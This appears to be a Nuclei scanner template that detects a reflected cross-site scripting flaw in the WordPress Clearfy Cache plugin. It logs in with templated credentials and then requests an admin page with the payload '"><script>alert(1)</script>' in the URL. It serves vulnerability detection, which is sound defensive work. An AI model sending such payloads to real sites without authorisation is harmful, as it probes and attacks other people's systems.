http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - '"><script>alert(1)</script>'
    - Webcraftic Clearfy - WordPress optimization plugin
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Origin: {{RootURL}}

    Content-Type: application/x-www-form-urlencoded

    Cookie: wordpress_test_cookie=WP%20Cookie%20check


    log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

    '
  - 'GET /wp-admin/admin.php?page=gonzales-wbcr_clearfy&action=index&wbcr_assets_manager=1&a"><script>alert(1)</script>
    HTTP/1.1

    Host: {{Hostname}}

    '
id: clearfy-cache-xss
info:
  author: Akincibor
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 5.4
    cwe-id: CWE-80
  description: WordPress Clearfy Cache 2.0.5 does not escape some URLs before outputting
    them back in attributes, leading to reflected cross-site scripting.
  metadata:
    max-request: 2
  name: WordPress Clearfy Cache <2.0.5 - Cross-Site Scripting
  reference:
  - https://wpscan.com/vulnerability/a59e7102-13d6-4f1e-b7b1-75eae307e516
  - https://wordpress.org/plugins/clearfy
  severity: medium
  tags: xss,wp,wordpress,authenticated,clearfy-cache,wpscan,wp-plugin,vuln
